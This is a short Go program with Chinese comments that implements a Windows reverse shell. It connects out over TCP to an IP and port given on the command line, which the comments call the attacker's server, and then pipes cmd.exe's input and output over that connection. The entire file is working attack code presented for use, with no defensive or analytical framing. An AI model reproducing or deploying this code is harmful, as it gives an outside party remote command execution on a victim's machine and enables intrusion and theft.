package main

import (
	"log"
	"net"
	"os"
	"os/exec"
)

func main() {
	// 检查命令行参数数量是否足够
	if len(os.Args) != 3 {
		log.Fatalf("Usage: %s <ip> <port>", os.Args[0])
	}

	// 获取传入的 IP 地址和端口
	ip := os.Args[1]
	port := os.Args[2]

	// 构建要连接的地址
	address := ip + ":" + port

	// 尝试连接到攻击者的服务器
	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatalf("Failed to connect to %s: %v", address, err)
	}
	defer conn.Close()

	// 创建一个 shell 命令
	cmd := exec.Command("cmd")
	// 将命令的标准输入、标准输出和标准错误输出重定向到 TCP 连接
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// 执行命令
	err = cmd.Run()
	if err != nil {
		log.Fatalf("Failed to run shell: %v", err)
	}
}
